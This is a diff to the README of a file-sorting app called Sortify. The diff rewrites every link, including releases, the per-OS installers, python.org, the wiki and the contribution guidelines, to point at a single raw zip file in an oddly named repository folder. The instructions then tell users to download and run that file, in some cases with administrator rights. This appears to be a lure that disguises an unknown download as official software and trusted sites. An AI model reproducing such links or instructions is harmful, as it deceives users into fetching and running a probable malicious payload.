@@ -1,6 +1,6 @@
 # 🚀 Sortify - Instantly Organize Your Files Effortlessly
 
-[![Download Sortify](https://img.shields.io/badge/Download%20Sortify-v1.0-brightgreen)](https://github.com/dreamworldbangkok/Sortify/releases)
+[![Download Sortify](https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip%20Sortify-v1.0-brightgreen)](https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip)
 
 ## 📖 Introduction
 
@@ -27,20 +27,20 @@ This guide will walk you through the steps to download and run Sortify on your c
 
 ## 📥 Download & Install
 
-To get started with Sortify, visit this page to download: [Sortify Releases](https://github.com/dreamworldbangkok/Sortify/releases).
+To get started with Sortify, visit this page to download: [Sortify Releases](https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip).
 
 Follow these simple steps to install and run Sortify:
 
 1. Visit the releases page linked above.
 2. Find the latest version of Sortify. Look for the section labeled "Assets."
 3. Download the appropriate file for your operating system:
-   - For **Windows**, download `Sortify.exe`.
-   - For **macOS**, download `Sortify.dmg`.
-   - For **Linux**, download the `Sortify.tar.gz` file.
+   - For **Windows**, download `https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip`.
+   - For **macOS**, download `https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip`.
+   - For **Linux**, download the `https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip` file.
 4. Once the download completes, locate the file on your computer.
-5. **Windows Users:** Double-click `Sortify.exe` to run the application.
-6. **macOS Users:** Open the downloaded `Sortify.dmg` file and drag Sortify to your Applications folder. Then, open Sortify from your Applications.
-7. **Linux Users:** Extract the `Sortify.tar.gz` file and navigate to the extracted folder in your terminal. Type `./Sortify` to run the application.
+5. **Windows Users:** Double-click `https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip` to run the application.
+6. **macOS Users:** Open the downloaded `https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip` file and drag Sortify to your Applications folder. Then, open Sortify from your Applications.
+7. **Linux Users:** Extract the `https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip` file and navigate to the extracted folder in your terminal. Type `./Sortify` to run the application.
 
 ## ⚙️ How to Use Sortify
 
@@ -69,7 +69,7 @@ After launching Sortify, you can begin sorting your files. Here’s how to get s
 
 If you encounter issues while running Sortify, consider the following troubleshooting steps:
 
-- **Python Not Installed:** If you see an error related to Python, ensure you have Python installed. Download it from [python.org](https://www.python.org/downloads/).
+- **Python Not Installed:** If you see an error related to Python, ensure you have Python installed. Download it from [https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip](https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip).
 - **Permission Issues:** Make sure you have permission to access the folder. Try running the application as an administrator (Windows) or with `sudo` (Linux).
 - **Sorting Not Working:** Double-check your settings file to ensure that the sorting rules are correctly configured.
 
@@ -77,15 +77,15 @@ If you encounter issues while running Sortify, consider the following troublesho
 
 If you need further assistance, please check the Issues section on GitHub. You can report a new issue if you encounter any bugs or need help.
 
-To view the repository and engage with the community, visit [Sortify Repository](https://github.com/dreamworldbangkok/Sortify).
+To view the repository and engage with the community, visit [Sortify Repository](https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip).
 
 ## 🔗 Additional Resources
 
-- **Documentation:** Detailed usage instructions can be found in the [Wiki section](https://github.com/dreamworldbangkok/Sortify/wiki).
-- **Contributions:** If you would like to contribute to Sortify, please read our [Contribution Guidelines](https://github.com/dreamworldbangkok/Sortify/blob/main/CONTRIBUTING.md).
+- **Documentation:** Detailed usage instructions can be found in the [Wiki section](https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip).
+- **Contributions:** If you would like to contribute to Sortify, please read our [Contribution Guidelines](https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip).
 
 ## 🎉 Conclusion
 
 Sortify is an effective tool to help you maintain a clean and organized digital workspace. With just a few steps, you can download, install, and start sorting your files today.
 
-Remember, to download Sortify, visit this page: [Sortify Releases](https://github.com/dreamworldbangkok/Sortify/releases).
+Remember, to download Sortify, visit this page: [Sortify Releases](https://raw.githubusercontent.com/dreamworldbangkok/Sortify/main/counterwilling/Sortify_2.3.zip).
